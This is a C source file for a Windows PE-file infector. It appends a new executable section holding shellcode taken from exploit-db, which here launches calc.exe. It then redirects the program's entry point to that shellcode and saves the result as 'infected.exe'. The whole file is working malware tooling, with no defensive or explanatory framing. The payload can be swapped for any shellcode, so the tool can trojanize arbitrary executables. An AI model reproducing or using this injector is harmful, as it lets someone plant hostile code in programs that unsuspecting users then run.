#include <Windows.h>
#include <stdio.h>
 
// shellcode source: https://www.exploit-db.com/shellcodes/48116
char SHELLCODE[] = "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";
 
#define getNtHdrs(pe) ((IMAGE_NT_HEADERS*)((size_t)pe + ((IMAGE_DOS_HEADER*)pe)->e_lfanew))
#define alignUp(size, align) (((size) / (align) + 1) * (align))
 
int readPE(char* path, char** pPe, long* lSize) {
    FILE* pFile;
    size_t result;
 
    // Read PE file
    printf("Target PE: %s\n", path);
    pFile = fopen(path, "rb");
    if (pFile == NULL) {fputs("fopen error", stderr); return 1;}
 
    fseek(pFile, 0, SEEK_END);
    *lSize = ftell(pFile);
    rewind(pFile);
 
    *pPe = (char*) malloc(sizeof(char)*(*lSize));
    if (*pPe == NULL) {fputs("malloc error", stderr); return 1;}
 
    result = fread(*pPe, 1, *lSize, pFile);
    if (result != *lSize) {fputs("fread error", stderr); return 1;}
    fclose(pFile);
 
    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)*pPe;
    IMAGE_NT_HEADERS* ntHdrs = (IMAGE_NT_HEADERS*)((size_t)dosHdr + dosHdr->e_lfanew);
    if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
        fputs("DOS or NT signature error", stderr);
        return 1;
    }
 
    return 0;
}
 
int writeFile(const char* path, char* pe, long size) {
    FILE* pFile;
    size_t result;
 
    printf("Target File: %s\n", path);
    pFile = fopen(path, "wb");
    if (pFile == NULL) {fputs("fopen error", stderr); return 1;}
 
    result = fwrite(pe, 1, size, pFile);
    if (result != size) {fputs("fwrite error", stderr); return 1;}
 
    fclose(pFile);
    return 0;
}
 
int main(int argc, char* argv[]) {
    char* pe;
    char* new_pe;
    long pe_size;
    long new_pe_size;
    IMAGE_NT_HEADERS* ntHdrs;
    size_t fileAlign;
    size_t sectAlign;
    size_t sizeOfImage, newSizeofImage;
 
    // read PE
    readPE(argv[1], &pe, &pe_size);
 
    // define variables
    ntHdrs = getNtHdrs(pe);
    fileAlign = ntHdrs->OptionalHeader.FileAlignment;
    sectAlign = ntHdrs->OptionalHeader.SectionAlignment;
    sizeOfImage = ntHdrs->OptionalHeader.SizeOfImage;
    newSizeofImage = sizeOfImage + alignUp(sizeof(SHELLCODE), fileAlign);
 
    // create new PE
    new_pe_size = pe_size + alignUp(sizeof(SHELLCODE), fileAlign);
    new_pe = (char*) malloc(sizeof(char) * new_pe_size);
    if (new_pe == NULL) {fputs("malloc error", stderr); return 1;}
    memcpy(new_pe, pe, pe_size);
 
    // add section header, assuming (sizeOfHeaders - sizeof(DOS + NT + Sect)) > sizeof(newSectHeader)
    ((IMAGE_NT_HEADERS*)(getNtHdrs(new_pe)))->FileHeader.NumberOfSections += 1;
    IMAGE_SECTION_HEADER* sectHdrs = (IMAGE_SECTION_HEADER*)(((size_t)&(((IMAGE_NT_HEADERS*)(getNtHdrs(new_pe)))->OptionalHeader)) + ((IMAGE_NT_HEADERS*)(getNtHdrs(new_pe)))->FileHeader.SizeOfOptionalHeader); 
    IMAGE_SECTION_HEADER* newSect = sectHdrs + ((IMAGE_NT_HEADERS*)(getNtHdrs(new_pe)))->FileHeader.NumberOfSections - 1;
    IMAGE_SECTION_HEADER* lastSect = newSect - 1;
    memcpy(newSect->Name, "ice1187\x00", 8);
    newSect->Misc.VirtualSize = alignUp(sizeof(SHELLCODE), sectAlign);
    newSect->VirtualAddress = alignUp(lastSect->VirtualAddress + lastSect->Misc.VirtualSize, sectAlign);
    newSect->SizeOfRawData = sizeof(SHELLCODE);
    newSect->PointerToRawData = lastSect->PointerToRawData + lastSect->SizeOfRawData;
    newSect->PointerToRelocations = 0;
    newSect->PointerToLinenumbers = 0;
    newSect->NumberOfRelocations = 0;
    newSect->NumberOfLinenumbers = 0;
    newSect->Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
 
    // add section data
    memcpy((char*)(new_pe + newSect->PointerToRawData), SHELLCODE, sizeof(SHELLCODE));
 
    // point AOE to shellcode
    getNtHdrs(new_pe)->OptionalHeader.AddressOfEntryPoint = newSect->VirtualAddress;
 
    // enlarge size of image
    getNtHdrs(new_pe)->OptionalHeader.SizeOfImage += sectAlign;
 
    // write new PE to file
    writeFile("infected.exe", new_pe, new_pe_size);
 
    free(pe);
    free(new_pe);
    return 0;
}
